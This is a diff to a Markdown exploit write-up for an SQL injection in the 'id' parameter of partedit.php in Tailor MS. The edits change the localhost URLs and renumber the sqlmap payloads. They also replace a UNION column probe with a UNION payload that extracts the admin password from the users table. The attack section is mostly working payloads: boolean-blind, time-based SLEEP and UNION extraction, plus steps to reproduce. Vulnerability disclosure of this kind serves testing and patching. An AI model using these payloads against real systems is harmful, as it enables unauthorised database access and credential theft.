@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in partedit.php (`http://localhost/tailor/partedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in partedit.php (`http://localhost:8000/partedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `partedit.php` endpoint of **Tailor 
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/partedit.php?id=1`
+- **URL:** `http://localhost:8000/partedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `partedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 4176=(SELECT (CASE WHEN (4176=4176) THEN 4176 ELSE (SELECT 2121 UNION SELECT 8568) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 5462 FROM (SELECT(SLEEP(5)))mCds)-- GDnp`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 4 columns
-  - **Payload:** 
-```
-id=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766b7671,0x4e73674343516b784652424c584b525175554f4f4f7372684b5a734e6e5a7a72686b49665664704d,0x71766b6a71)-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/partedit.php?id=-1' union select 1,password,3,4 from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/partedit.php?id=1`.  
+1. Browse to `http://localhost:8000/partedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `partedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
